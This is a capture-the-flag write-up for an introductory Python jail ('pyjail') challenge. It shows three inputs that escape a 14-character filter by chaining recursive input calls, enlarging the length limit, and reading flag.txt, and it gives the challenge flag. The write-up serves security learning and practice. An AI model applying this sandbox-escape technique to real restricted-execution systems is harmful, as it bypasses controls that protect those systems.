# filter'd 

Solved by: @vicevirus

- Category: pyjail, introductory, golf
- Description: i asked the tech support guy for help with escaping this jail but all he said in his reply was "lmao u just got filter'd"...

### Solution:

Conditions:
`def f(code):` only allows max 14 chars, only have ascii characters (<128) (https://www.asciitable.com/) and do not contain the blacklisted keywords.

1. First Input:
```
i=input;f(i())
```
to meet the <14 chars, we alias the `input` as `i`, then call it into the `f()`, `f(i())`. So we can add another input.

2. Second Input:
```
M*=9;f(i())
```

We increase the length. `M*=9`, means `14*9=126`. We have 126 characters space now. again, `f(i())` to add another input

3. Third Input:
```
print(open('flag.txt').read())
```
since no more characters limit, we can read the flag by not using the blacklisted keywords.
vicevirus used `print(open('flag.txt').read())`

Flag: `jail{can_you_repeat_that_for_me?_aacb7144d2c}`


